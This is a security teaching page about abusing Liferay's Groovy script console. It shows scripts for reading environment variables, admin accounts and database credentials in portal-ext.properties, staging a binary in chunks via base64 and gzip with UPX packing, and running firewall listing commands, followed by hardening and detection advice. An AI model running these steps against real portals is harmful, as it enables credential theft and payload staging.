# The Liferay Groovy script console

Full writeup: [jperezduerto.info/techniques/liferay-groovy-console](https://jperezduerto.info/techniques/liferay-groovy-console/)

Liferay's Control Panel ships a Groovy script console (Server Administration >
Script) that runs code in the portal JVM with the privileges of the account
Liferay runs as. There is no sandbox, so reaching the console means code
execution as that service account. This folder shows, read-only where it
matters, what that exposes, so defenders understand the real attack surface,
then how to restrict, contain, and detect it.

Scope: this is a teaching resource. It covers enumeration, file read, and file
transfer so you can recognize and detect them. It does **not** cover executing
staged binaries, packing, or privilege escalation. For the over-privileged
service case that turns this console into host compromise, see
[tcb-privilege-to-system](../tcb-privilege-to-system/).

## Account and host enumeration (read-only)

Confirm the identity and context the console runs as:

```groovy
println System.getProperty("user.name")
println System.getProperty("os.name") + " " + System.getProperty("os.version")
println System.getProperty("liferay.home")
System.getenv().sort().each { k, v -> println "${k}=${v}" }
```

Enumerate application accounts through Liferay's own services (read-only):

```groovy
import com.liferay.portal.kernel.service.UserLocalServiceUtil
import com.liferay.portal.kernel.service.RoleLocalServiceUtil

// How many users, and who the administrators are
println "users: " + UserLocalServiceUtil.getUsersCount()
UserLocalServiceUtil.getRoleUsers(
    RoleLocalServiceUtil.getRole(
        com.liferay.portal.kernel.util.PortalUtil.getDefaultCompanyId(),
        "Administrator").getRoleId()
).each { println "admin: " + it.getScreenName() + " <" + it.getEmailAddress() + ">" }
```

The lesson for a defender: the reach of all of this equals the privilege of the
service account and the admin role. Keep both small.

## File read (read-only)

Groovy reads any file the service account can read. The usual prize is the
portal configuration, which often holds database credentials in cleartext:

```groovy
def home = System.getProperty("liferay.home")
println new File(home, "portal-ext.properties").text
```

If that file carries a `jdbc.default.*` block, a single reachable admin page has
become a data-store credential disclosure.

## File transfer (why the console is arbitrary-write, not just a script runner)

A script console does not only read; it writes. An attacker who cannot use an
upload form can still move bytes through the text box by encoding them.
base64+gzip is a common transport: compress and base64 on one side, decode and
decompress inside a short script on the other. Shown here writing and verifying
a file so you can see the shape of it; no execution is performed (running a
landed binary and chaining it to SYSTEM is the app-admin-to-system-chain post).

Encode on your side:

```bash
gzip -c helper.bin | base64 -w0 > blob.b64          # Linux
```
```powershell
$b=[IO.File]::ReadAllBytes("helper.bin");$ms=New-Object IO.MemoryStream;$gz=New-Object IO.Compression.GzipStream($ms,[IO.Compression.CompressionMode]::Compress);$gz.Write($b,0,$b.Length);$gz.Close();[Convert]::ToBase64String($ms.ToArray())|Set-Content -NoNewline blob.b64
```

Decode inside the console:

```groovy
// b64 = a gzip-compressed, base64-encoded payload pasted as text
def b64 = "H4sIAAAA..."                        // truncated placeholder
def gz  = new ByteArrayInputStream(b64.decodeBase64())
def data = new java.util.zip.GZIPInputStream(gz).bytes
def out = new File(System.getProperty("java.io.tmpdir"), "transferred.bin")
out.bytes = data
// Verify integrity, do not run anything
println java.security.MessageDigest.getInstance("SHA-256")
    .digest(out.bytes).encodeHex().toString()
```

The defensive takeaway: treat the console as granting arbitrary file **write**
to the service account, not just script evaluation. That is why the hardening
below restricts who can reach it and what the account can touch, and why the
detection below watches for file creation by the service account.

Size limits and chunking: the console input is a POST form field capped by the
servlet container (roughly 2 MB on a default bundle). base64 inflates by ~1/3,
so about 1.4 MB of compressed payload fits in one paste. For more, append the
base64 across several runs and decode the reassembled file at the end:

```groovy
new File("C:/ProgramData/stage/blob.b64") << "<next slice of base64>"   // once per chunk
// final run: new File(...).text.decodeBase64() -> GZIPInputStream -> write + verify
```

Shrink the binary first with UPX (the public executable packer, whose purpose is
size) so fewer chunks are needed:

```bash
upx --best --lzma helper.bin      # often 50-70% smaller for a native PE/ELF
```

A UPX-packed file is already compressed, so a further gzip gains little: pick one
(UPX usually beats gzip on a native .exe; gzip alone is simpler for scripts).
Confirm the packed binary still runs in a lab before relying on it.

Detection does not care about the encoding: the signal is a new file under the
service account, especially an executable or a temp-dir file, and the
chunk-reassembly shows up as repeated small writes growing one file. Durable
control: application control (WDAC/AppLocker, a `noexec` mount) so a landed
binary cannot execute, plus a service account that can only write where needed.

## Remote connectivity and egress

Groovy has the JVM's networking, so the console can open outbound connections.
An attacker uses this to learn what the host can reach, which shapes any later
pivot or data movement. This is a connectivity test, not a channel to anywhere:

```groovy
// Can the host reach a destination? No shell, no persistent channel.
try {
  def s = new Socket()
  s.connect(new InetSocketAddress("TARGET-HOST", 443), 3000)
  println "reachable: ${s.isConnected()}"
  s.close()
} catch (e) { println "blocked or unreachable: ${e.message}" }
```

Defensive reading: the Liferay host should reach only its database and the
services it genuinely needs. Default-deny outbound egress turns this into a dead
end, and an unexpected outbound connection from the portal account is a signal.

## Checking the local firewall

Host firewall state is read-only reconnaissance, but reading it means invoking
the OS tool, which spawns a process, and that spawn is itself loud. Shown here
only to list rules, never to change them:

```groovy
// Read-only: show the host firewall. Listing only, never add or disable a rule.
def win = System.getProperty("os.name").toLowerCase().contains("win")
def cmd = win
  ? ["cmd", "/c", "netsh advfirewall show allprofiles"]
  : ["sh", "-c", "iptables -L -n 2>/dev/null || nft list ruleset 2>/dev/null"]
println cmd.execute().text
```

The host firewall is not the control to lean on: the service account can read
it and, if over-privileged, change it. The controls that hold are least
privilege, network-level egress filtering, and an alert when the portal account
runs firewall or network tooling at all.

## Defense

The console is safe only when few people can reach it, the account behind it is
weak, and its use is watched.

- **Restrict or remove the console in production.** Treat Server Administration
  > Script as break-glass. Grant the administrative permissions that reach it
  to a single, tightly held role, audit that list, and keep the admin UI off
  the public internet (VPN or allowlisted management network, segmented from
  the user-facing site).
- **Run Liferay least privileged.** A dedicated, low-privilege service account,
  never root, Administrator, or LocalSystem, and with no powerful Windows user
  rights. This caps the blast radius of both file read and file write.
- **Keep secrets out of reach.** Do not store database or integration
  credentials in cleartext in `portal-ext.properties` where the service
  account can read them. Use a secret store or restrictive file permissions,
  and rotate anything that may have been exposed.
- **Enforce MFA on admins.** Most console abuse starts with a weak or reused
  admin credential, not a Liferay bug. Protect omni-admin and company-admin
  accounts the hardest.
- **Control egress.** Default-deny outbound filtering at the network so the host
  reaches only its database and required services. This caps what a reachable
  console can do with its networking and makes any attempt a clear signal.

## Detection

- **Liferay audit events.** Enable auditing and alert on access to Server
  Administration and on script execution outside your break-glass process.
- **Access logs.** Requests to the Server Administration script endpoint are a
  narrow, high-signal path; alert on an unexpected user, IP, or hour.
- **Service-account behavior.** The portal account creating files (especially
  executables or files in temp directories), reading credential files, spawning
  a process, or making unexpected outbound connections is strong evidence the
  console (or another code-execution path) is in use. Endpoint and
  process/file-creation telemetry on the host catches this even when the app
  logs do not.
- **Network and firewall tooling.** The portal account running `netsh`,
  `iptables`, `nft`, or opening an outbound connection to a destination it never
  normally contacts, is anomalous and high-signal. That account has no business
  enumerating or touching the firewall.
- **Correlate.** An admin authentication, then a Server Administration script
  request, then the service account writing a file or touching credentials, is
  the full chain and a high-confidence detection.

## Use

Authorized and educational use only: your own systems, a lab you control, or an
engagement with written permission. The snippets here are read-only recon,
configuration read, and a file-write illustration to show why an exposed
console is dangerous and how to detect it, not a toolkit for use against
systems you do not own.
